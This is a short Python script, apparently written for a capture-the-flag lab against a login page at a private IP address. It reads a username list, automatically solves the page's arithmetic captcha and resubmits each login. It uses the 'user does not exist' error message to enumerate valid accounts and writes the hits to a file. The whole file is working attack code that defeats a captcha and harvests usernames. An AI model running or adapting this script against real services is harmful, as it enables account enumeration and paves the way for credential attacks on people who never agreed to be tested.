import requests
import re
class Colors:
    RESET= '\033[0m'
    RED = '\033[31m'
    CYAN = '\033[36m]'
#arguement=sys.argv
#username=arguement[1]

with open("usernames4.txt", "r") as f:
    lines= f.readlines()
for line in lines:
    stripped_line=line.strip()
    url='http://10.10.59.39/login'
       
    payload={'username':stripped_line, 'password':'password1'}
    
    response= requests.post(url,data=payload)
    #time.sleep(2)
    text=response.text
#print(text)
    match=re.search(r'(\d+)\s*([+\-*\/])\s*(\d+)\s*=', text)
    if match:
        num1=int(match.group(1))
        operator=match.group(2)
        num2=int(match.group(3))
        equation= f"{num1} {operator} {num2}"
        
        if operator == '*':
            result=num1 * num2
        elif operator == '+':
            result=num1 + num2
        elif operator == '-':
            result=num1 - num2
        elif operator == '/':
            result=num1 / num2
        print(f"username : {stripped_line}: captcha: {equation}={result}")
        payload={'username':stripped_line, 'password':'password1', 'captcha':result}
        response=requests.post(url,data=payload)
        #time.sleep(2)
        second_response=response.text
        does_not_exist_match=re.search(r'The user &#39;(\w+)&#39; does not exist',second_response)
        if does_not_exist_match:

            no_user=does_not_exist_match.group()
            print(f'user {stripped_line} does not exist')
        else:
            
            success = open("success.txt", "w")
            print(Colors.RED+"We finally found it! "+ stripped_line + " may be the correct user!"+Colors.RESET)
            success.write(f" {stripped_line} is the correct user \n")
            success.close()
    else:
        print("no match")
